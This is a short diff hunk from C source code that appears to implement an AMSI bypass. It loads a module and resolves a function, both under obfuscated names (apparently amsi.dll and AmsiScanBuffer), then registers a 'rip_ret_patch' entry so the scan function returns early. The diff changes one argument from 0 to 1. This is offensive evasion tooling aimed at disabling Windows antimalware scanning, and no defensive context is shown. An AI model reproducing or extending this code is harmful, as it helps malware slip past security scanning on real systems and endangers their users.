@@ -535,7 +535,7 @@ int main(int argc, char **argv){
 
 	HINSTANCE hinst = LoadLibraryA(ammod);
 	uintptr_t amsiPatchAddr = (uintptr_t)GetProcAddress(GetModuleHandleA(ammod), fasb);
-	insert_descriptor_entry(amsiPatchAddr, 0, rip_ret_patch, GetCurrentThreadId());
+	insert_descriptor_entry(amsiPatchAddr, 1, rip_ret_patch, GetCurrentThreadId());
 	//printf("GetCurrentThreadId: %lu\n", GetCurrentThreadId());
 	//printf("amsiPatchAddr: %u\n", amsiPatchAddr);
 
